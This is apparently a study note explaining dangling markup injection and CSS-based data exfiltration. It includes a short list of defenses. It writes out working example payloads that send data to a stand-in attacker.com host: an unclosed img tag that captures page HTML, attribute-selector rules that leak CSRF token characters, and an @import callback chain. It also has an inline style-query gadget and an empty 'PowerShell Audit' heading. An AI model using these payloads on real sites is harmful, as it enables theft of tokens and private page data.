To understand **Dangling Markup Injection**, it’s best to view it not as a standalone type of Cross-Site Scripting (XSS), but as a highly clever **data exfiltration technique** used when traditional XSS is blocked.

While standard XSS aims to execute JavaScript, Dangling Markup aims to **steal the contents of the page** (like CSRF tokens, passwords, or personal data) by "clinging" to the rest of the HTML.1

---

## 1. The Core Difference: Execution vs. Exfiltration

The primary distinction lies in what the attacker is trying to achieve and what the browser actually does.

|**Feature**|**Standard XSS (Reflected/Stored)**|**Dangling Markup Injection**|
|---|---|---|
|**Primary Goal**|Execute arbitrary JavaScript.|Capture and send page data to an external server.|
|**Requirement**|Needs `<script>` tags, event handlers (`onload`), or `javascript:` URI.|Needs an attribute that takes a URL (like `src` or `href`).|
|**Bypass Capability**|Often blocked by Content Security Policy (CSP) or input filters.|Often bypasses CSP if "unsafe-inline" is blocked but external images are allowed.|
|**The "Payload"**|A functional script: `alert(1)`.|An "unfinished" HTML tag: `<img src='https://attacker.com/log?data=`.|

---

## 2. How it Works: The "Dangling" Effect

In a standard XSS attack, you provide a balanced, closed tag. In a Dangling Markup attack, you deliberately leave a tag **open** (unfinished).

The browser, trying to be helpful, parses everything after your injection as part of your tag's attribute until it encounters the next matching quote.

### The Scenario

Imagine a page that displays a username from a URL parameter and contains a sensitive CSRF token further down:
```html
<p>Hello, [USER_INPUT]</p>
<form action="/update-password">
   <input type="hidden" name="token" value="SECRET_12345">
</form>
```

### The Injection

Instead of a script, the attacker inputs:
`<img src='https://attacker.com/log?content=`

### The Resulting Render

The browser sees this:
```html
<p>Hello, <img src='https://attacker.com/log?content=</p>
<form action="/update-password">
   <input type="hidden" name="token" value="SECRET_12345">
</form> ...
```

Because the `src` attribute started with a single quote `'`, the browser will keep gobbling up all the HTML (including the secret token) until it hits the _next_ single quote. It then makes a GET request to the attacker’s server containing that entire block of HTML.

---

## 3. Why Use This Over Regular XSS?

Dangling Markup is usually a "Plan B" or "Plan C" for attackers. It is specifically effective when:
1. **Strict Content Security Policy (CSP):** If the site prohibits `<script>` tags and `eval()`, regular XSS is dead. However, sites almost always allow `<img>` tags or `<style>` tags.
2. **No Scripting Environment:** Some email clients or specialized browsers disable JavaScript entirely.2 Dangling markup relies on HTML parsing, not script execution, so it still works.
3. **WAF Filters:** Web Application Firewalls often look for keywords like `alert`, `script`, or `onerror`. They might not flag a seemingly harmless `<img>` tag with a missing closing quote.
---
### Best Defenses
- **Content Security Policy (CSP):** Use a strict `img-src` or `connect-src` that only allows trusted domains.
- **Output Encoding:** This is the ultimate fix. If the `<` in the attacker's input is converted to `&lt;`, the browser won't treat it as a new tag.
- **Empty Attributes:** Ensure your sensitive tokens are not immediately followed by single quotes that an attacker can "hook" into.

---


> [!Question] 
> How does CSS used in dangling markup

Actually, CSS is often considered the **most dangerous weapon** in the dangling markup and scriptless-attack arsenal. While an `<img>` tag can only steal one large "chunk" of text at a time, CSS allows an attacker to perform **brute-force extraction of secrets** (like CSRF tokens or passwords) character by character.

If you have a strict Content Security Policy (CSP) that blocks `<script>` but allows `<style>`, CSS injection can be just as lethal as XSS.

---

## 1. Brute-Forcing Tokens with Attribute Selectors

This is the most common "value" of CSS in dangling markup. CSS has "Attribute Selectors" that check if a value starts with a specific character (`^=`).

### The Attack Logic:

1. The attacker injects a `<style>` block.
2. They write a rule: "If the CSRF token starts with 'a', load a background image from my server."
3. They write another rule: "If it starts with 'b', load a different image."
4. By checking which image hits their server, they know the first letter. They repeat this for the second, third, and fourth letters.

**Example Payload:**
```css
/* Does the token start with 'a'? */
input[name='csrf_token'][value^='a'] { 
    background-image: url('https://attacker.com/exfil?char=a'); 
}

/* Does it start with 'b'? */
input[name='csrf_token'][value^='b'] { 
    background-image: url('https://attacker.com/exfil?char=b'); 
}
```

---

## 2. The `@import` Chain (Blind Exfiltration)

Dangling markup is often "blind"—the attacker can't see the page. Using the `@import` rule, they can create a "callback loop."
1. **Injection:** The attacker injects `@import 'https://attacker.com/start';`.
2. **Server Response:** The attacker's server sends back CSS that tests for the first character (as shown above).
3. **Discovery:** Once the attacker's server receives the request for `char=a`, it sends a _new_ `@import` containing rules to test for the _second_ character: `value^='aa'`, `value^='ab'`, etc.
This allows them to "walk" through a 32-character token in seconds without ever needing JavaScript.

---

## 3. Font-Face Exfiltration (Stealing Body Text)
What if the secret isn't in an `input` attribute? What if it's just text on the screen (like a bank balance)? Attackers can use `@font-face` with `unicode-range`
1. The attacker defines a custom font where only the letter "A" has a specific `unicode-range`.
2. The `src` for that font is a URL to the attacker's server.
3. If the letter "A" exists on the page, the browser **must** download that font.
4. The attacker sees the request and knows the page contains the letter "A".

---

## 4. New Techniques: "Conditional" CSS
Recent research (as of 2024/2025) has shown that even **inline styles** can be abused. Using the new CSS `if()` statements (style queries) and `image-set()`, attackers can create logic gates within a single `style` attribute:

```html
<div style="--val:attr(title); --exfil:if(style(--val:'secret'): url(/hit); else: url(/miss)); background:image-set(var(--exfil))" title="secret">
```

_Even if you can't inject a full `<style>` block, just being able to control a `style="..."` attribute can be enough to leak data._

---

## PowerShell Audit: Finding CSS Injection

### Summary of CSS "Value" in Attacks:
- **Precision:** It can steal specific attributes (`value`, `title`, `data-*`).
- **Stealth:** It doesn't trigger "No-Script" alerts or CSP "unsafe-inline" script blocks.
- **Speed:** It can be automated via `@import` to recursively steal data.
